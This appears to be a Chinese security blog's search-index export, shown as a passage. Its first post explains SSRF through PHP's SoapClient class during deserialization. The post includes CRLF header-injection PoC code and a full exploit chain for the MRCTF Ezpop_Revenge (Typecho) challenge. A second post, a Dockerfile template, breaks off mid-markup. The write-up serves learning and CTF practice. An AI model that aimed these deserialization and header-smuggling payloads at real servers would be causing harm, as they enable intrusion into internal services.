<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于反序列化中原生类的利用</title>
    <link href="/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="关于反序列化中原生类的利用"><a href="#关于反序列化中原生类的利用" class="headerlink" title="关于反序列化中原生类的利用"></a>关于反序列化中原生类的利用</h1><p>配置环境,修改php.ini</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">得添加extension=php_soap.dll (加载soap 内置包)<br><br>修改soap.wsdl_cache_enabled=<span class="hljs-number">1</span> 改为soap.wsdl_cache_enabled=<span class="hljs-number">0</span> 这个是soap的缓存，测试的时候最好改为<span class="hljs-number">0</span>，上线稳定了改为<span class="hljs-number">1</span><br><br>soap有两种模式一种是wsdl,一种是no-wsdl<br></code></pre></div></td></tr></table></figure><p>关于soap用法 ，可参考<a href="https://www.jb51.net/article/153394.htm">https://www.jb51.net/article/153394.htm</a></p><p>SoapClient用于调用远程服务器上的SoapServer页面，并实现了对相应函数的调用。</p><p>可以先看一下原生类方法</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = get_declared_classes();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = get_class_methods(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span><br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></div></td></tr></table></figure><p>关于soapclient有</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">SoapClient:</span>:__<span class="hljs-keyword">call</span><br><span class="hljs-symbol">SoapFault:</span>:__toString<br><span class="hljs-symbol">SoapFault:</span>:__wakeup<br></code></pre></div></td></tr></table></figure><p>对于<strong>soapclient</strong>的实例有两种:</p><p>一种是通过wsdl文件，wsdl文件可以放在本地，也可以是通过远程引用，但我还没太了解这个。</p><p><code>$soap = new SoapClient(&quot;file.wsdl&quot;);</code></p><p>另一种不提供wsdl文件。如下当然只是简单的对象生成，还可以有很多参数，可以通过数组继续增加，还可以有<code>user_agent</code></p><p><code>$soap = new SoapClient(null,array(&quot;location&quot;=&gt;&quot;服务地址&quot;,&quot;uri&quot;=&gt;&quot;命名空间&quot;));</code></p><p>这个原生类的主要作用就在于触发它的<code>__call</code>方法来导致SSRF打内网的效果。先简单看网上的几个样例。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;bbb&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;not_exists_function();<br></code></pre></div></td></tr></table></figure><p>然后在本机上监听一下，但是很疑惑的是<code>call</code>方法到底是怎么实现的，看了很多文章都没介绍为啥，正常将call方法第一个传参的是调用的方法名，后面是参数，这个竟然能请求到自己设置的服务地址，大受震撼。这里简单调试了一下大概能懂一点。</p><p>实例化一个soapclient内容如下，还有后面两个参数。<br><img src="https://img-blog.csdnimg.cn/a73a9b8fcdb648b7b2293536cafd3a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看了一下文档和<code>SoapClient-&gt;__doRequest</code>方法有关</p><p><img src="https://img-blog.csdnimg.cn/cb545f31b3b84873ae1a337d02b03a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这个会向服务地址发起请求，然后看了一下源码执行后的打印结果。</p><p><img src="https://img-blog.csdnimg.cn/b005026ce0994500a58e1c4372925c43.png" alt="在这里插入图片描述"></p><p>这里<code>SoapClient-&gt;__doRequest</code>的第一个参数为xml格式内容，第二个应该就是请求地址，最后是<code>uri</code>和调用的不存在方法。<code>call</code>方法的实现应该会用到<code>SoapClient-&gt;__doRequest</code>但还是没太懂。</p><p><img src="https://img-blog.csdnimg.cn/c1c25c79cb89430f8b2bb3ab3d2d2be7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里还存在clrf漏洞,可以伪造post请求。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span> = unserialize(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span>-&gt;sdadasd();<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2ade19efff4343ce9f7696d731dbc675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="MRCTF-Ezpop-Revenge"><a href="#MRCTF-Ezpop-Revenge" class="headerlink" title="MRCTF Ezpop_Revenge"></a>MRCTF Ezpop_Revenge</h1><p>题目是typecho1.2得反序列化，进入题目后没发现什么就经典扫一下目录，发现有<code>www.zip</code>泄露，拿到源码开始审计。</p><p>先看flag.php，这里看到需要本地访问，应该是要ssrf打<br><img src="https://img-blog.csdnimg.cn/5e975e9d78d448a8b21eb45f945ec42e.png" alt="在这里插入图片描述"></p><p>搜索一下<code>unserialize</code>发现入口，在<code>Plugin.php</code>过滤了很多rce函数。然后实例化得参数为数组里面得两个值。<br><img src="https://img-blog.csdnimg.cn/505c8db80de7404fad8be47662562abb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7ddc47cef7aa4724bec0d208e200cbff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跟进<code>Typecho_Db</code>实例化的过程，跟进后有很多代码，基本上是数据库查询得一些操作。构造函数这有一个字符串得连接，这里想到的可以利用<code>__toString</code>，再接着往下看。<br><img src="https://img-blog.csdnimg.cn/601489e2744b46009af248e7b725cebf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>慢慢看发现一个<code>call_user_func</code>函数，突然觉得是不是利用这个，后来发现不可控，而且都暗示要SSRF了肯定是不能RCE命令执行的，放弃了。<br><img src="https://img-blog.csdnimg.cn/4723c2ea3cd1422ebbaac7470a3affb8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>后面找到实例化sql对象。<br><img src="https://img-blog.csdnimg.cn/406a1f70027241d2bb223e471021defd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跟进能看到里面真有一<code>toString</code>函数<br><img src="https://img-blog.csdnimg.cn/7fde6098850643129e2b2ff94b0814c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>但到这就不知道怎么做了，看了wp才知道可以将<code>$this-&gt;_adapter</code>控制为<code>Soapclient</code>类触发<code>Soapclient</code>原生类的<code>__call</code>函数从而可以进行SSRF，可以看上面最开始写的这个原理。</p><p>捋一下思路：<br>最开始是反序列化触发__wakeup函数，实例化对象<code> $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);</code>这里可以将第一个参数<code>$this-&gt;coincidence[&#39;hello&#39;]</code>控制成为一个类，在Typecho_Db类中的<code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>这个地方触发<code>toString</code>函数，然后接着触发原生类的<code>call</code>函数达到打SSRF的效果。</p><p>exp如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld_DB</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$coincidence</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;coincidence[<span class="hljs-string">&#x27;hello&#x27;</span>] = <span class="hljs-keyword">new</span> Typecho_Db_Query();<br>        <span class="hljs-keyword">$this</span>-&gt;coincidence[<span class="hljs-string">&#x27;world&#x27;</span>] = <span class="hljs-string">&#x27;typecho_&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Db_Query</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sqlPreBuild</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_adapter</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,<br>            <span class="hljs-string">&quot;Cookie: PHPSESSID=e1g1ch42pgkoa25uclhko75l10&quot;</span><br>        );<br>        <span class="hljs-keyword">$this</span>-&gt;_adapter = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-string">&#x27;KK^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span> . join(<span class="hljs-string">&#x27;^^&#x27;</span>, <span class="hljs-variable">$headers</span>))));<br>        <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;action&#x27;</span>=&gt;<span class="hljs-string">&quot;SELECT&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bypass</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = explode(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$newstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/00/&#x27;</span>, <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>])) &#123;<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>] = preg_replace(<span class="hljs-string">&#x27;/s/&#x27;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$arr</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$newstr</span> .= <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$newstr</span> .= <span class="hljs-string">&quot;:&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$newstr</span> .= <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$newstr</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = serialize(<span class="hljs-keyword">new</span> HelloWorld_DB());<br><span class="hljs-variable">$test</span> = urlencode(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test</span> = preg_replace(<span class="hljs-string">&#x27;/%00/&#x27;</span>,<span class="hljs-string">&#x27;%5c%30%30&#x27;</span>, <span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test</span> = bypass(urldecode(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$test</span>);<br></code></pre></div></td></tr></table></figure><p>这里面还有个坑，就是上面可以看到它过滤了<code>%</code>但是exp中有很多是<code>private</code>属性需要用<code>%00</code>不可见字符填充，然后就需要用\00来代替%00。这里还有个知识点</p><blockquote><p>在 PHP5 最新的 CVS 中，<br>新的序列化方式叫做 escaped binary string 方式，这是相对与普通那种 non-escaped binary string 方式来说的：<br>string 型数据（字符串）新的序列化格式为：<br>S:”<length>“:”<value>“;<br>其中 <length> 是源字符串的长度，而非 <value> 的长度。<length> 是非负整数，数字前可以带有正号（+）。<value> 为经过转义之后的字符串。<br>它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 <value> 的内容了。</p></blockquote><p>普通的序列化小s对应的就是普通的字符串，如s:3:”%00a%00”;<br>而序列化的大S则对应的是\加上16进制，如S:2:”\00a\00”;</p><p>看个例子</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;123&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment"># code...</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// echo serialize(new A);</span><br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/50c6c8766f1d4270ae64f8dc45af5f5c.png" alt="在这里插入图片描述"><br>将不可见字符%00转化为十六进制，小s变成大S，可以成功执行。<br><img src="https://img-blog.csdnimg.cn/2092e96a463a460abe46cd2a585f867f.png" alt="在这里插入图片描述"></p><p>回到题目，路由在这里<br><img src="https://img-blog.csdnimg.cn/65f2eacd33b848149de828c57f356989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后发包得到flag<br><img src="https://img-blog.csdnimg.cn/60b2d5ad37f240eabcb12fba0a913562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker出题</title>
    <link href="/2021/07/29/2021-7-30-docker/"/>
    <url>/2021/07/29/2021-7-30-docker/</url>
    
    <content type="html"><![CDATA[<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><blockquote><p>Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 upstart/systemd 去启动后台服务，容器内没有后台服务的概念。 </p><p>对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。 </p></blockquote><h2 id="dockerfile模板"><a href="#dockerfile模板" class="headerlink" title="dockerfile模板"></a>dockerfile模板</h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 第一行写跟第1点中一样的基本镜像</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">14.04</span><br><span class="hljs-comment"># 这里可以写上你的姓名/昵称</span><br><span class="hljs-keyword">MAINTAINER</span> yourname<br><span class="hljs-comment"># 这里可以写上你的制作时间</span><br><span class="hljs-keyword">ENV</span> REFRESHED_AT <span class="hljs-number">2018</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span><br><span class="hljs-comment"># 使用utf-8编码</span><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-comment"># 先写 修改源/更新 【如果必须的话】</span><br><span class="hljs-comment"># 替换源（这里可用sed或者直接COPY一个完整的sources.list来替换）</span><br><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">&#x27;s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.163.com\/ubuntu\//g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-comment"># 进行更新</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get update -y</span><br><span class="hljs-comment"># 将环境变量设置为非交互的 【这个看个人】</span><br><span class="hljs-keyword">ENV</span> DEBIAN_FRONTEND noninteractive<br><br><span class="hljs-comment"># 再写 各种安装</span><br><span class="hljs-comment"># 如 安装mysql</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -y install mysql-server</span><br><span class="hljs-comment"># 安装apache2</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -yqq install apache2</span><br><span class="hljs-comment"># 安装php7</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -yqq install php7 libapache2-mod-php7</span><br><span class="hljs-comment"># 安装php扩展</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get install -yqq php7-mysql php7-curl php7-gd php7-intl php-pear php7-imagick php7-imap php7-mcrypt php7-memcache php7-ming php7-ps php7-pspell php7-recode php7-snmp php7-sqlite php7-tidy php7-xmlrpc php7-xsl</span><br><br><span class="hljs-comment"># 再 修改一些配置</span><br><span class="hljs-comment"># 对于文件中的替换字符串，多使用sed命令</span><br><span class="hljs-comment"># 例如去掉apache2的列目录漏洞</span><br><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">&#x27;s/Options Indexes FollowSymLinks/Options None/&#x27;</span> /etc/apache2/apache2.conf</span><br><br><span class="hljs-comment"># 然后才是复制文件，不推荐挂载卷</span><br><span class="hljs-comment"># ADD会自动解压压缩包，而COPY不会</span><br><span class="hljs-keyword">ADD</span><span class="bash"> html.tgz /var/www</span><br><br><span class="hljs-comment"># 剩下一些操作（权限要控制好）</span><br><span class="hljs-comment"># 例如修改某个文件的所有者</span><br><span class="hljs-keyword">RUN</span><span class="bash"> chown root:root /var/www/html/x.php</span><br><br><span class="hljs-comment"># start.sh为开机启动脚本，里面包含容器开启后要启动的命令</span><br><span class="hljs-keyword">COPY</span><span class="bash"> start.sh /root/start.sh</span><br><span class="hljs-comment"># 加上执行权限</span><br><span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /root/start.sh</span><br><span class="hljs-comment"># 使用ENTRYPOINT而不使用CMD（CMD容易受run命令最后的命令给影响）</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> <span class="hljs-built_in">cd</span> /root; ./start.sh</span><br><span class="hljs-comment"># WEB开放端口默认为80，一般为一个，若有特殊情况，请写明</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br></code></pre></div></td></tr></table></figure><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>进入终端</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs 